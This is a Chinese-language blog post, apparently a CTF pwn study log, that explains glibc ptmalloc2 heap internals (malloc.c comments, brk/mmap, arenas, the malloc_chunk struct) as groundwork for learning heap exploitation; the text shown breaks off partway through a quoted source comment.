<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="开始学习堆了，跟着ctfwiki学 [TOC]">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录-0x3">
<meta property="og:url" content="http://example.com/2021/09/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x3/index.html">
<meta property="og:site_name" content="STERIA LAB">
<meta property="og:description" content="开始学习堆了，跟着ctfwiki学 [TOC]">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-09-20T14:07:32.000Z">
<meta property="article:modified_time" content="2022-05-08T17:26:36.941Z">
<meta property="article:author" content="STEVE">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2021/09/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>刷题记录-0x3 | STERIA LAB</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">STERIA LAB</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">for my study life</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="STEVE">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="STERIA LAB">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          刷题记录-0x3
        </h1>

        <div class="post-meta">

            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-20 22:07:32" itemprop="dateCreated datePublished" datetime="2021-09-20T22:07:32+08:00">2021-09-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-09 01:26:36" itemprop="dateModified" datetime="2022-05-09T01:26:36+08:00">2022-05-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeups/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>开始学习堆了，跟着ctfwiki学</p>
<p>[TOC]</p>
<span id="more"></span>

<h2 id="深入理解Ptmalloc2"><a href="#深入理解Ptmalloc2" class="headerlink" title="深入理解Ptmalloc2"></a>深入理解Ptmalloc2</h2><h3 id="malloc概述（malloc-c）2-27"><a href="#malloc概述（malloc-c）2-27" class="headerlink" title="malloc概述（malloc.c）2.27"></a>malloc概述（malloc.c）2.27</h3><p>在malloc.c开头是对整个源码的介绍</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The main properties of the algorithms are:</span></span><br><span class="line"><span class="comment">  * For large (&gt;= 512 bytes) requests, it is a pure best-fit allocator,</span></span><br><span class="line"><span class="comment">    with ties normally decided via FIFO (i.e. least recently used).</span></span><br><span class="line"><span class="comment">  * For small (&lt;= 64 bytes by default) requests, it is a caching</span></span><br><span class="line"><span class="comment">    allocator, that maintains pools of quickly recycled chunks.</span></span><br><span class="line"><span class="comment">  * In between, and for combinations of large and small requests, it does</span></span><br><span class="line"><span class="comment">    the best it can trying to meet both goals at once.</span></span><br><span class="line"><span class="comment">  * For very large requests (&gt;= 128KB by default), it relies on system</span></span><br><span class="line"><span class="comment">    memory mapping facilities, if supported.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Standard (ANSI/SVID/...)  functions:</span></span><br><span class="line"><span class="comment">    malloc(size_t n);</span></span><br><span class="line"><span class="comment">    calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">    free(void* p);</span></span><br><span class="line"><span class="comment">    realloc(void* p, size_t n);</span></span><br><span class="line"><span class="comment">    memalign(size_t alignment, size_t n);</span></span><br><span class="line"><span class="comment">    valloc(size_t n);</span></span><br><span class="line"><span class="comment">    mallinfo()</span></span><br><span class="line"><span class="comment">    mallopt(int parameter_number, int parameter_value)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Additional functions:</span></span><br><span class="line"><span class="comment">    independent_calloc(size_t n_elements, size_t size, void* chunks[]);</span></span><br><span class="line"><span class="comment">    independent_comalloc(size_t n_elements, size_t sizes[], void* chunks[]);</span></span><br><span class="line"><span class="comment">    pvalloc(size_t n);</span></span><br><span class="line"><span class="comment">    malloc_trim(size_t pad);</span></span><br><span class="line"><span class="comment">    malloc_usable_size(void* p);</span></span><br><span class="line"><span class="comment">    malloc_stats();</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">	Supported pointer representation:       4 or 8 bytes</span></span><br><span class="line"><span class="comment">  	Supported size_t  representation:       4 or 8 bytes</span></span><br><span class="line"><span class="comment">       Note that size_t is allowed to be 4 bytes even if pointers are 8.</span></span><br><span class="line"><span class="comment">       You can adjust this by defining INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  	Alignment:                              2 * sizeof(size_t) (default)</span></span><br><span class="line"><span class="comment">       (i.e., 8 byte alignment with 4byte size_t). This suffices for</span></span><br><span class="line"><span class="comment">       nearly all current machines and C compilers. However, you can</span></span><br><span class="line"><span class="comment">       define MALLOC_ALIGNMENT to be wider than this if necessary.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  	Minimum overhead per allocated chunk:   4 or 8 bytes</span></span><br><span class="line"><span class="comment">       Each malloced chunk has a hidden word of overhead holding size</span></span><br><span class="line"><span class="comment">       and status information.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  	Minimum allocated size: 4-byte ptrs:  16 bytes    (including 4 overhead)</span></span><br><span class="line"><span class="comment">			  8-byte ptrs:  24/32 bytes (including, 4/8 overhead)</span></span><br><span class="line"><span class="comment">			  </span></span><br><span class="line"><span class="comment">	When a chunk is freed, 12 (for 4byte ptrs) or 20 (for 8 byte</span></span><br><span class="line"><span class="comment">       ptrs but 4 byte size) or 24 (for 8/8) additional bytes are</span></span><br><span class="line"><span class="comment">       needed; 4 (8) for a trailing size field and 8 (16) bytes for</span></span><br><span class="line"><span class="comment">       free list pointers. Thus, the minimum allocatable size is</span></span><br><span class="line"><span class="comment">       16/24/32 bytes.</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">	The maximum overhead wastage (i.e., number of extra bytes</span></span><br><span class="line"><span class="comment">       allocated than were requested in malloc) is less than or equal</span></span><br><span class="line"><span class="comment">       to the minimum size, except for requests &gt;= mmap_threshold that</span></span><br><span class="line"><span class="comment">       are serviced via mmap(), where the worst case wastage is 2 *</span></span><br><span class="line"><span class="comment">       sizeof(size_t) bytes plus the remainder from a system page (the</span></span><br><span class="line"><span class="comment">       minimal mmap unit); typically 4096 or 8192 bytes.</span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment">       It is assumed that (possibly signed) size_t values suffice to</span></span><br><span class="line"><span class="comment">       represent chunk sizes. `Possibly signed&#x27; is due to the fact</span></span><br><span class="line"><span class="comment">       that `size_t&#x27; may be defined on a system as either a signed or</span></span><br><span class="line"><span class="comment">       an unsigned type. The ISO C standard says that it must be</span></span><br><span class="line"><span class="comment">       unsigned, but a few systems are known not to adhere to this.</span></span><br><span class="line"><span class="comment">       Additionally, even when size_t is unsigned, sbrk (which is by</span></span><br><span class="line"><span class="comment">       default used to obtain memory from system) accepts signed</span></span><br><span class="line"><span class="comment">       arguments, and may not be able to handle size_t-wide arguments</span></span><br><span class="line"><span class="comment">       with negative sign bit.  Generally, values that would</span></span><br><span class="line"><span class="comment">       appear as negative after accounting for overhead and alignment</span></span><br><span class="line"><span class="comment">       are supported only via mmap(), which does not have this</span></span><br><span class="line"><span class="comment">       limitation.</span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment">       Even a request for zero bytes (i.e., malloc(0)) returns a</span></span><br><span class="line"><span class="comment">	pointer to something of the minimum allocatable size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   	Requests for sizes outside the allowed range will perform an optional</span></span><br><span class="line"><span class="comment">       failure action and then return null. (Requests may also</span></span><br><span class="line"><span class="comment">       also fail because a system is out of memory.)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>malloc中支持申请的堆块<ul>
<li>大于等于512bytes: 最佳匹配算法,先进先出</li>
<li>小于等于64bytes: 通过缓存机制分配,使用缓存池,快速分配重利用小堆块</li>
<li>大于128kb: 取决于操作系统的mmap</li>
</ul>
</li>
<li>malloc支持的函数<ul>
<li>标准C<ul>
<li>malloc(size_t n);</li>
<li>calloc(size_t n_elements, size_t element_size);</li>
<li>free(void* p);</li>
<li>realloc(void* p, size_t n);</li>
<li>memalign(size_t alignment, size_t n);</li>
<li>valloc(size_t n);</li>
<li>mallinfo()</li>
<li>mallopt(int parameter_number, int parameter_value)</li>
</ul>
</li>
<li>扩展函数<ul>
<li>independent_calloc(size_t n_elements, size_t size, void* chunks[]);</li>
<li>independent_comalloc(size_t n_elements, size_t sizes[], void* chunks[]);</li>
<li>pvalloc(size_t n);</li>
<li>malloc_trim(size_t pad);</li>
<li>malloc_usable_size(void* p);</li>
<li>malloc_stats();</li>
</ul>
</li>
</ul>
</li>
<li>重要数据<ul>
<li>支持pointer类型, 4或8bytes</li>
<li>支持size_t类型,4或8bytes<ul>
<li>通过宏定义<code>INTERNAL_SIZE_T</code> 可以设置size_t为4bytes,即使pointer类型表示8bytes</li>
</ul>
</li>
<li> 对齐:默认<code>2 * sizeof(size_t)</code> </li>
<li>如果size_t是4字节的话,按照8字节对齐</li>
<li>适用于目前所有的操作系统和C编译器,但我们也可以根据需求通过宏定义<code>MALLOC_ALIGNMENT</code>让它变得更大</li>
<li>chunk头大小: 4字节或8字节</li>
<li>支持最小分配大小: <ul>
<li>32位地址:16bytes(包括4字节的chunk头)</li>
<li>64位地址:24/32bytes(包括4/8字节的chunk头)</li>
<li>在chunk被free了以后,还需要额外的字节去存储pre_size和fd,bk<ul>
<li>32位为: 4+8 = 12 bytes</li>
<li>64位为: 4+16 = 20 bytes 或 8+16 = 24 bytes</li>
</ul>
</li>
<li>堆块最多使用的头部大小一般小于最小分配大小,当申请的堆块大于mmap_threshold, 使用2*sizeof(size_t)*page(系统页大小,一般为4096或8192 bytes)</li>
</ul>
</li>
<li>malloc对异常处理:<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序(<code>sbrk</code>接受有符号整数)就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="malloc-c-主要函数"><a href="#malloc-c-主要函数" class="headerlink" title="malloc.c 主要函数"></a>malloc.c 主要函数</h3><pre><code>#### free
</code></pre>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">  allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">  effects if p has already been freed.  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>free函数:</p>
<ul>
<li>free函数释放指针p所指向的内存,通常是通过malloc或者realloc等方式申请的\<ul>
<li>如果p为null,free函数不执行任何操作</li>
<li>如果p已经被释放了,再释放会有漏洞 (double free)</li>
<li>除了通过mallopt被禁用以外,释放很大的内存空间的时候会自动还给操作系统,减少程序所使用的内存空间</li>
</ul>
</li>
</ul>
<h4 id="系统内存交互函数"><a href="#系统内存交互函数" class="headerlink" title="系统内存交互函数"></a>系统内存交互函数</h4><p>malloc和free等函数都不是真正和内存交互的函数,其实现是通过**(s)brk<strong>以及</strong>mmap**,<strong>munmap</strong>函数</p>
<p>应用程序(用户)使用<code>malloc</code>函数(链接库函数),<code>malloc</code>调用<code>__brk </code>以及<code>__mmap</code>(链接库函数)执行中断(trap to system),操作系统底层调用<code>sys_brk</code>以及<code>sys_mmap_pgoff</code>实现内存分配</p>
<h5 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h5><p>对于堆,操作系统提供<code>brk</code>函数,glibc提供<code>sbrk</code>函数,我们可以通过增加brk的大小来向操作系统申请内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Definition for getting more memory from the OS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MORECORE         (*__morecore)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MORECORE_FAILURE 0</span></span><br><span class="line"><span class="keyword">void</span> * __default_morecore (<span class="keyword">ptrdiff_t</span>);</span><br><span class="line"><span class="keyword">void</span> *(*__morecore)(<span class="keyword">ptrdiff_t</span>) = __default_morecore;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MORECORE is the name of the routine to call to obtain more memory</span></span><br><span class="line"><span class="comment">  from the system.  See below for general guidance on writing</span></span><br><span class="line"><span class="comment">  alternative MORECORE functions, as well as a version for WIN32 and a</span></span><br><span class="line"><span class="comment">  sample version for pre-OSX macos.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MORECORE sbrk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>ptrdiff_t</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int64 <span class="keyword">size_t</span>;</span><br><span class="line">    <span class="keyword">typedef</span> __int64          <span class="keyword">ptrdiff_t</span>;</span><br><span class="line">    <span class="keyword">typedef</span> __int64          <span class="keyword">intptr_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>     <span class="keyword">size_t</span>;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">int</span>              <span class="keyword">ptrdiff_t</span>;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">int</span>              <span class="keyword">intptr_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li><p><code>__default_morecore</code>是一个函数声明:</p>
<p><strong>morecore.c:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__default_morecore (<span class="keyword">ptrdiff_t</span> increment)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *result = (<span class="keyword">void</span> *) __sbrk (increment);</span><br><span class="line">  <span class="keyword">if</span> (result == (<span class="keyword">void</span> *) <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>MORECORE</code>是一个函数类型定义。</p>
</li>
<li><p>MORECORE是向操作系统申请内存的例程,例程是某个系统对外提供的功能接口或服务的集合,这里MORECORE定义为sbrk,我们也可以自定义这个例程的实现</p>
</li>
</ul>
<p>![image-20220504230025184](C:\youyue’s blog\source_posts\刷题记录-0x3\image-20220504230025184.png)</p>
<ul>
<li>初始时堆的起始地址<code>start_brk</code>和堆的末尾<code>brk</code>指向同一个地址<ul>
<li>如果开启ASLR: <code>start_brk</code>以及<code>brk</code>会在bss高地址的随机偏移处</li>
<li>如果不开ASLR:<code>start_brk</code>以及<code>brk</code>会在data/bss的结尾</li>
</ul>
</li>
</ul>
<h5 id="mmap和munmap"><a href="#mmap和munmap" class="headerlink" title="mmap和munmap"></a>mmap和munmap</h5><p>malloc会使用mmap来创建独立的匿名映射段,匿名映射可以申请以0填充的内存,且这块内存仅被调用进程所使用,munmap将申请的内存空间还给操作系统</p>
<ul>
<li>申请mmap内存的时候,注意是从mmap段开始向低地址申请地址</li>
</ul>
<h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>dlmalloc的实现中,所有线程共享一个堆,因此当两个线程同时申请内存的时候,只有一个线程可以进入临界区申请,另一个必须等待临界区中不再有线程.在ptmalloc中,所有的线程共享多个堆</p>
<ul>
<li>主线程<ul>
<li>主线程申请内存的时候,malloc使用brk申请(main_arena),此时malloc为了减少内核态于用户态的切换(brk耗费的系统资源过多),会一次性申请较多的内存(0x21000byte),在线程内部进行管理,后续也会一直在main_arena中获取内存,当arena空间不足的时候,再通过增加brk的方式来增加堆空间</li>
<li>主线程释放内存的时候,main_arena没有进行回收,而是通过glibc管理,在后面程序再次申请内存的时候,就可以直接在用户态分配内存</li>
</ul>
</li>
<li>第一个线程<ul>
<li>在第一个线程申请堆空间之前,第一个线程的栈是存在的</li>
<li>在第一个线程malloc以后,第一个线程的堆通过mmap建立(thread_arena),所在位置在内存映射段取余,分配给线程的堆空间也是0x21000byte(132KB),不过是直接分配给程序的内存为1M,只是有读写权限的部分只有132KB</li>
<li>第一个线程释放内存了以后也不会马上还给操作系统</li>
</ul>
</li>
<li>当用户请求的内存大于128KB的时候,且没有任何arena有足够的空间是,系统会执行mmap函数来分配相应的内存空间,这个请求与主线程,从线程无关</li>
</ul>
<h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>malloc申请的内存称为chunk,使用malloc_chunk结构体表示,free以后chunk会进入相应的空闲管理列表(bin)中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>INTERNAL_SIZE_T</code>, <code>SIZE_SZ</code>, <code>MALLOC_ALIGN_MASK</code>: malloc_internal.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span></span><br><span class="line"><span class="comment">   chunk sizes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The default version is the same as size_t.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   While not strictly necessary, it is best to define this as an</span></span><br><span class="line"><span class="comment">  